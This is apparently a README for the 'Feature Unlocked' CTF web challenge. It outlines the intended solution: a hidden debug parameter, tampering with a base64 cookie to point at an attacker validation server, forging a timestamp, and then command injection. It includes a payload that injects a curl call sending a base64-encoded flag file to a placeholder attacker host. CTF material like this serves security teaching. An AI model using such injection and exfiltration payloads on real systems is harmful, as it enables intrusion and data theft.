# Feature Unlocked

### Web application advertising a new feature, but it only unlocks 7 days after the CTF

- Players read code and find the hardcoded `debug=true` GET param
- When this is set, it will read the `validation_server` from the `preferences` cookie, if specified
- Players must b64 decode the cookie, add their own validation server and resubmit the cookie (with the GET param)
- On the attacker server, they should generate some keys ([gen_key.py](solution/gen_key.py)) and forge a timestamp ([server.py](solution/server.py)) 7+ days in the future
- Now, they will get access to the new feature! An access cookie will be granted so that they can visit `/feature`
- This is part 2 of the challenge, a word counting feature with simple command injection
- There is no output to the command, so players should exfiltrate the flag using curl, e.g. `hi; curl https://ATTACKER_SERVER?lol=$(cat flag.txt | base64)`

For a detailed and in-depth explanation of the `Feature Unlocked` challenge, you can refer to [this](https://crypto-cat.gitbook.io/ctf-writeups/2024/cyberspace/web/feature_unlocked) writeup.
